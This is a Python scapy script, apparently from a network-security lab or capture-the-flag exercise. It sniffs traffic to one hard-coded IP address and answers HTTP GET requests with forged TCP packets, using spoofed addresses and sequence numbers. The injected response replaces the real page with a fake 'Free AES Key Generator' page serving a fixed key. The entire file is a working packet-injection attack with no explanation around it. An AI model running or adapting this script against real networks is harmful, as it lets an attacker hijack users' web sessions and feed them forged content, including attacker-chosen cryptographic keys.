#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
import time

newHtml = "<html>\r\n<head>\r\n<title>Free AES Key Generator!</title>\r\n</head>\r\n<body>\r\n<h1 style=\"margin-bottom: 0px\">Free AES Key Generator!</h1>\r\n<span style=\"font-size: 5%\">Definitely not run by the NSA.</span><br/>\r\n<br/>\r\n<br/>\r\nYour <i>free</i> AES-256 key: <b>49276d20737475636b20696e20616e20414553206b657920666163746f727921</b><br/>\r\n</body>\r\n</html>\r\n"

def dnshandle(packet):
	if packet[TCP].payload:
		strPacket = str(packet[TCP].payload)
		if 'http' in strPacket.lower() and 'get' in strPacket.lower():
			payload = "HTTP/1.1 200 OK\r\nServer: nginx/1.4.6 (Ubuntu)\r\nDate: "+" GMT\r\nContent-Type: text/html; charset=UTF-8\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"+format(len(newHtml), '03x')+"\r\n"+newHtml+"\r\n0\r\n\r\n"
			reply = IP(tos = 0x0, src = packet[IP].dst, dst = packet[IP].src, flags = 'DF')/TCP(seq = packet[TCP].ack, ack = packet[TCP].seq + len(packet[TCP].payload), dport = packet[TCP].sport, sport = packet[TCP].dport, flags = 'PA')/payload	
			reply = reply.__class__(str(reply))
			conf.L3socket = L3RawSocket
			send(reply)

sniff(filter="tcp and host 54.85.9.24", prn=dnshandle)


